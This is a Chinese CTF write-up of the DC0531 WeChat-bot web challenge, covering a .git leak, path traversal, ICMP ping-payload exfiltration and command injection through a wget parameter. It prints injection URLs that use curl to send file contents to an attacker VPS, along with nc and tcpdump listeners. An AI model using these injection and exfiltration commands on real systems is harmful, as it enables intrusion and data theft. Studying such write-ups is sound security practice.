# 一道有意思的web题&DC0531-web

阅读量 **143369**

|评论 **1**

|![](https://p0.ssl.qhimg.com/sdm/30_30_100/t01f942715e2a0f1a23.png)

发布时间 : 2018-06-21 12:01:13

 **x**

##### 译文声明

本文是翻译文章

译文仅供参考，具体内容表达以及含义原文为准。

![](https://p0.ssl.qhimg.com/t0147f51d3594704c4f.jpg)

## 前言

今天恰好放假，遇到一个比赛，发现了一个比较有意思的题目，于是做了一下总结，于是有了这篇文章

## 题目流程

题目首先给出一个公众号，本以为是一个签到题，没想到成为全场比赛我认为质量最高的题目。。。  
当然比赛的时候本人很菜，没有做出，赛后进行了复现，感谢C26大佬的writeup。  
首先是关注微信公众号，然后我们按照提示操作  
  
依次使用后，并没有发现有用的点  
并且`shoot a target (s:xxx)`十分瞩目  
因为我们不知道攻击对象，全靠猜  
后来发现竟然是跟一个ip  
  
随后上了我的vps，想尝试让题目访问我的vps  
结果发现日志是看不到的，这里就猜测到可能使用了ping这样的命令  
最初的想法是用ceye的dns log查看访问记录  
结果发现不能指定域名，例如：

    
    
    s:skysec.top
    

这样是被过滤的，刚开始我是想找到我的ceye的ip:port  
但是发现好像依旧不能收到dns log = =  
于是我只能想办法在自己的服务器上进行流量捕捉  
最好方法应该就是tcpdump了，方便快捷  
首先上vps查看网卡

    
    
    ifconfig
    

发现网卡为eth0  
然后利用tcpdump抓取这个网卡的icmp包

    
    
    tcpdump -i eth0 icmp
    

发现果然抓到了ping的请求  
  
得到目标ip为

    
    
    139.198.3.171
    

然后对目标ip进行探测  
发现存在.git泄露  
  
利用工具将源码下载下来，进行审计  

###  攻击思路思考

发现关键控制器

    
    
    139.198.3.171/Application/Home/Controller/TestController.class.php
    

关键代码如下

    
    
    $msg = $wechat->serve();
                $this->username = $msg->FromUserName;
                $this->real_path = $this->tmp_path . md5($this->salt . $this->username);
                if(!is_dir($this->real_path)){
                    mkdir($this->real_path);
                    system('cp ./Public/* '.$this->real_path);
                    $this->info['weapon'] = 'fist';
                    $this->info['status'] = 100;
                    $this->info['bullet'] = substr(base64_encode(file_get_contents($this->real_path.'/'.$this->info['weapon'])),0,100);
    
                }else{
                    $this->info = json_decode(file_get_contents($this->real_path . '/info'),TRUE);
                }
    
    
                // 回复文本消息
                if ($msg->MsgType == 'text') {
                    if(!strstr($msg->Content,':')){
                        $wechat->reply($this->menu());
                    }else{
                        $tmp = explode(':' , $msg->Content);
                        $func = $tmp[0];
                        $arg = $tmp[1];
                        switch ($func) {
                            case 'f':
                                $wechat->reply($this->f());
                                break;
                            case 'p':
                                $wechat->reply($this->p($arg));
                                break;
                            case 'r':
                                $wechat->reply($this->r());
                                break;
                            case 's':
                                $wechat->reply($this->s($arg));
                                break;
                            case 'c':
                                $wechat->reply($this->c());
                                break;
                            case 'sh':
                                $wechat->reply($this->sh());
                            default:
                                $wechat->reply("Unsupported method!n");
                                break;
                        }
                    }
    
                }else if($msg->MsgType == 'image') {
                    $wechat->reply($this->u($msg->PicUrl));
                }else{
                    $wechat->reply("Unsupported message type!n");
                }
    
                // store user info
                file_put_contents($this->real_path . '/info' , json_encode($this->info));
            }
    
            public function menu(){
                $menu = '';
                $menu .= "Welcome to Hence's unknown battle ground!n";
                $menu .= "you have following options to utilize:n";
                $menu .= "1. find a weapon (f:)n";
                $menu .= "2. pick up a weapon (for instance: p:kar98)n";
                $menu .= "3. reload a weapon (r:)n";
                $menu .= "4. shoot a target (s:xxx)n";
                $menu .= "5. check ur weapon's status (c:)n";
                $menu .= "6. upload ur weapon (just upload image-file)n";
                $menu .= "7. show ur weapon (sh:)n";
                return $menu;
    
            }
    
            public function f(){
                $res = "Here are your weapons:n";
    
                foreach (scandir($this->real_path) as $value) {
                    if($value != '.'  && $value != '..' && $value != 'info'){
                        $res .= $value . "n";
                        array_push($this->all_weapons,$value);
                    }
                }
                return $res;
            }
    
            public function p($weapon){
                $res = "";
                if(!is_file($this->real_path . '/' . $weapon)){
                    $res = "No such weapon! U bitch!n";
                }else{
                    $this->info['weapon'] = $weapon;
                    $this->info['bullet'] = substr(base64_encode(file_get_contents($this->real_path . '/' . $this->info['weapon'])),0,100);
                    // no bullets initially
                    $this->info['status'] = 0;
                    $res = "You have changed ur weapon to " . $weapon . "n";
                }
                return $res;
            }
    
            public function r(){
                $res = "";
                $this->info['status'] = 100;
                $res = "Reload OK!";
                return $res;
            }
    
            public function s($target){
                $res = "";
                if(!preg_match('/^(?:25[0-5]|2[0-4]d|1dd|[1-9]d|d)(?:[.](?:25[0-5]|2[0-4]d|1dd|[1-9]d|d)){3}$/', $target)){
                    $res = "This is not a target! R U kidding?n";
                }else{
                    // make sure u have bullets
                    if($this->info['status']>0){
                        $this->info['status'] = $this->info['status'] - 1;
                        $bullet = $this->info['bullet'][100 - $this->info['status']];
                        system("ping -c 1 -W 1 -p '" . bin2hex($bullet) ."' ".$target . " 2>&1 1>/dev/null");
                        $res = "You hit it once!n";
                    }else{
                        $res = "You have run out of bulletsn";
                    }
                }
                return $res;
            }
    
            public function c(){
                $res = "Ur weapon is " . $this->info['weapon'] . "n";
                $res .= $this->info['status'] . " bullet(s) leftn";
                return $res;
            }
    
            public function u($PicUrl){
                shell_exec("wget " . $PicUrl . " -O " . $this->real_path . '/' . $this->info['weapon']." 2>&1 1>/dev/null");
                return "Update your weapon successfully!";
            }
    
            public function sh()
            {
               return "Sorry, not support yet!n";
            }
    
        }
    

通读全部代码，关注点停留在如下几个函数

    
    
    public function p($weapon){
        $res = "";
        if(!is_file($this->real_path . '/' . $weapon)){
            $res = "No such weapon! U bitch!n";
        }else{
            $this->info['weapon'] = $weapon;
            $this->info['bullet'] = substr(base64_encode(file_get_contents($this->real_path . '/' . $this->info['weapon'])),0,100);
            // no bullets initially
            $this->info['status'] = 0;
            $res = "You have changed ur weapon to " . $weapon . "n";
        }
        return $res;
    }
    

可以清楚看到，这个函数中有读文件操作

    
    
    $this->info['bullet'] = substr(base64_encode(file_get_contents($this->real_path . '/' . $this->info['weapon'])),0,100);
    

并且由于`$weapon`可控，这里完全可以在知道绝对路径的情况下进行目录穿越和任意文件读取  
但是关于`$this->info['bullet']`的输出点，我们后续再看  
然后是命令执行的一个函数

    
    
    public function s($target){
        $res = "";
        if(!preg_match('/^(?:25[0-5]|2[0-4]d|1dd|[1-9]d|d)(?:[.](?:25[0-5]|2[0-4]d|1dd|[1-9]d|d)){3}$/', $target)){
            $res = "This is not a target! R U kidding?n";
        }else{
            // make sure u have bullets
            if($this->info['status']>0){
                $this->info['status'] = $this->info['status'] - 1;
                $bullet = $this->info['bullet'][100 - $this->info['status']];
                system("ping -c 1 -W 1 -p '" . bin2hex($bullet) ."' ".$target . " 2>&1 1>/dev/null");
                $res = "You hit it once!n";
            }else{
                $res = "You have run out of bulletsn";
            }
        }
        return $res;
    }
    

这里想直接利用system非常困难，因为`$target`被过滤，而`$bullet`已经被转为16进制，需要进行组合攻击  
以及另一个命令执行点

    
    
    public function u($PicUrl){
        shell_exec("wget " . $PicUrl . " -O " . $this->real_path . '/' . $this->info['weapon']." 2>&1 1>/dev/null");
        return "Update your weapon successfully!";
    }
    

这里相对来说，$PicUrl没有过滤，如果能够伪造，则可以命令执行  
那么我们依次分析这两种攻击

###  利用ping进行任意文件读取

回到最初的文件读取

    
    
    public function p($weapon){
        $res = "";
        if(!is_file($this->real_path . '/' . $weapon)){
            $res = "No such weapon! U bitch!n";
        }else{
            $this->info['weapon'] = $weapon;
            $this->info['bullet'] = substr(base64_encode(file_get_contents($this->real_path . '/' . $this->info['weapon'])),0,100);
            // no bullets initially
            $this->info['status'] = 0;
            $res = "You have changed ur weapon to " . $weapon . "n";
        }
        return $res;
    }
    

我们尝试目录穿越

    
    
    p:../../../../../../etc/passwd
    

得到回显

    
    
    You have changed ur weapon to ../../../../../../etc/passwd
    

但是如果我们发送

    
    
    p:../../../../../../test
    

则会收到

    
    
    No such weapon! U bitch!
    

  
这里就和代码完全吻合了  
如果我们构造的目录穿越后的目录存在，则会成功file_get_contents()  
而如果目录不存在，则会提示  
而我们根据git泄露的代码知道，flag.php位置应该在

    
    
    /var/www/html/flag.php
    

我们尝试读取  
  
发现可以成功改变  
那么下一个问题就是如何将读取的内容打出来  
我们观察到这个函数

    
    
    public function s($target){
        $res = "";
        if(!preg_match('/^(?:25[0-5]|2[0-4]d|1dd|[1-9]d|d)(?:[.](?:25[0-5]|2[0-4]d|1dd|[1-9]d|d)){3}$/', $target)){
            $res = "This is not a target! R U kidding?n";
        }else{
            // make sure u have bullets
            if($this->info['status']>0){
                $this->info['status'] = $this->info['status'] - 1;
                $bullet = $this->info['bullet'][100 - $this->info['status']];
                system("ping -c 1 -W 1 -p '" . bin2hex($bullet) ."' ".$target . " 2>&1 1>/dev/null");
                $res = "You hit it once!n";
            }else{
                $res = "You have run out of bulletsn";
            }
        }
        return $res;
    }
    

如之前提及，去bypass $target实现任意命令执行显然比较困难  
但这里我们可以发现

    
    
    system("ping -c 1 -W 1 -p '" . bin2hex($bullet) ."' ".$target . " 2>&1 1>/dev/null");
    

在系统执行ping命令的时候会带出$bullet的数据  
而$bullet的来源则是：

    
    
    $bullet = $this->info['bullet'][100 - $this->info['status']];
    

正是我们之前任意文件读取的值`info['bullet']`  
于是我们选择抓取icmp包，并查看详情

    
    
    tcpdump -i eth0 icmp -nn -XX -vvv
    

  
当然这也看很难受，我们将其重定向到文本里

    
    
    tcpdump -i eth0 icmp -nn -XX -vvv > tcpdump.txt
    

然后我们去公众号疯狂请求`s:vpsip`  
然后将tcpdump.txt稍作处理  
  
不难看出所有的icmp包携带了base64  
我们将其导出合并得到

    
    
    D9waHAKJGZsYWcgPSAiREMwNTMxe1dlY2hBdF9Jc19Tb19DMG9sfSI7Cg==
    

但是直接解码是不能成功的,我们随便补上一位  
  
成功得到flag

    
    
    DC0531{WechAt_Is_So_C0ol}
    

###  RCE-方法1

我们可以看到如下代码

    
    
     public function u($PicUrl){
        shell_exec("wget " . $PicUrl . " -O " . $this->real_path . '/' . $this->info['weapon']." 2>&1 1>/dev/null");
        return "Update your weapon successfully!";
    }
    

这里是我最开始做题的时候的想法  
但是这里的$PicUrl若想可控，需要过前面的判断

    
    
    else if($msg->MsgType == 'image') {
        $wechat->reply($this->u($msg->PicUrl));
    }else{
        $wechat->reply("Unsupported message type!n");
    }
    

这里想到的第一件事就是抓包，但是微信抓包显然不太容易  
后来才想到，可以利用thinkphp的路由调用

    
    
    http://139.198.3.171/?c=test&a=u&PicUrl=;curl vpsip:8888/`whoami`
    

这里c代表controller，a代表action  
而我们选择testcontroller和u函数触发代码  
然后再vps上监听

    
    
    nc -l -vv 8888
    

即可收到回显  
  
获取flag

    
    
    http://139.198.3.171/?c=test&a=u&PicUrl=;curl vpsip:8888/`cat%20/var/www/html/flag.php%20|%20base64`
    

得到flag

    
    
    PD9waHAKJGZsYWcgPSAiREMwNTMxe1dlY2hBdF9Jc19Tb19DMG9sfSI7Cg==
    

###  RCE-方法2

法2类似强网杯的wechat那题

    
    
    https://www.cnblogs.com/iamstudy/articles/2th_qiangwangbei_ctf_writeup.html
    

查看sdk，然后构造xml注入攻击  
这里也是通过c26大佬的题解才有所了解  
文件路径如下

    
    
    ThinkPHP/Library/Gaoming13/WechatPhpSdk/Wechat.class.php
    

在

    
    
    public function reply($msg)
    

可以看到如下代码

    
    
    case 'text_simple':
    $xml = sprintf('<xml>'.
        '<ToUserName><![CDATA[%s]]></ToUserName>'.
        '<FromUserName><![CDATA[%s]]></FromUserName>'.
        '<CreateTime>%s</CreateTime>'.
        '<MsgType><![CDATA[text]]></MsgType>'.
        '<Content><![CDATA[%s]]></Content>'.
        '</xml>',
        $this->message->FromUserName,
        $this->message->ToUserName,
        time(), 
        $msg);
    break;
    

可以大概对xml的格式有个了解  
剩下的就是构造了  
大致如下

    
    
    <xml>
        <ToUserName>2</ToUserName>
        <FromUserName>1</FromUserName>
        <CreateTime>1529256180</CreateTime>
        <MsgType>image</MsgType>
        <Content><![CDATA[123]]></Content>
        <PicUrl>;{cmd};</PicUrl>
    </xml>
    

然后就是利用现有代码和泄露的key进行签名，伪造攻击,就不再赘述  
注：  
git泄露的token并不是真实的  
这里也是c26大佬发现了文件泄露

    
    
    http://139.198.3.171/Application/Home/Controller/TestController.class.php.bak
    

## 后记

感谢师傅们赛后的交流，让我从一个题目中涨了不少姿势，感谢OTZ。

审核人：yiwang 编辑：边边

本文翻译自 [原文链接]()。如若转载请注明出处。

商务合作，文章发布请联系 anquanke@360.cn

本文由 **一叶飘零** 原创发布

转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
[https://www.anquanke.com/post/id/148346](/post/id/148346)

安全客 - 有思想的安全新媒体

本文转载自: []()

如若转载,请注明出处： []()

安全客 - 有思想的安全新媒体

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

  * [writeup](/tag/writeup)
  * [技术分析](/tag/技术分析)
  * [安全研究](/tag/安全研究)
  * [DC0531](/tag/DC0531)

 **+1** __1赞

 __收藏

![](https://p0.ssl.qhimg.com/t0115eb10739cb26739.png) 一叶飘零

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

